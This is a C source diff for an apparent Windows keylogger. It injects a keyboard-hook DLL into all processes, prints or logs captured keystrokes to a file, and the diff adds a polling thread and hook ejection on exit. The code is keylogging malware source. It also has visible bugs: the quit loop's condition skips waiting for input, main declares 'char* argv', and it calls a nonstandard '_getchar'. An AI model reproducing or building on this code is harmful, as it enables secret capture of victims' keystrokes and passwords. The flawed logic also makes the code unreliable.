@@ -9,6 +9,7 @@ PFN_GET_KEYBOARD_VALUE GetKeyboardValue = NULL;
 BOOL optFilesave = FALSE;
 char* logFileName = "";
 FILE* loggingFile = NULL;
+BOOL threadEnd = FALSE;
 
 DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
 {
@@ -16,6 +17,9 @@ DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
 
 	while (1)
 	{
+		if (threadEnd)
+			_endthreadex(0);
+
 		if (IsNewKeyHit)
 		{
 			char keyValue = GetKeyboardValue();
@@ -30,15 +34,18 @@ DWORD WINAPI GetKeyBoardValueThreadFunc(LPVOID lpParam)
 			else
 				printf("KeyBoard Hit:%c\n",keyValue);
 		}
+
+		Sleep(10);
 	}
 }
 
 int main(int argc, char* argv)
 {
 	const char* opt_pattern = "as:p:n:";
-	int opt = 0;
+	int opt = 0,threadID=0;
 	DWORD injectedPID=0;
 	DWORD *pInjectedPID = &injectedPID;
+	HANDLE hThread = NULL;
 
 	if (argc <= 1)
 	{
@@ -104,4 +111,30 @@ int main(int argc, char* argv)
 
 	if (optFilesave)
 		loggingFile = fopen(logFileName, "w");
+
+	hThread = (HANDLE)_beginthreadex(NULL, 0, GetKeyBoardValueThreadFunc, NULL, 0, &threadID);
+
+	if (hThread == 0)
+	{
+		printf("Thread start failed.\n");
+		exit(-1);
+	}
+	
+	char endChar = 0;
+	printf("Press q is end....\n");
+	while (endChar == 'q' || endChar == 'Q')
+	{
+		endChar = _getchar();
+	}
+	threadEnd = TRUE;
+
+	WaitForSingleObject(hThread, INFINITE);
+
+	if (!InjectAllProcess(EJECTION_MODE, KEYBOARD_HOOK_PATH))
+	{
+		printf("ejection Failed!\n");
+		exit(-1);
+	}
+
+	return 0;
 }
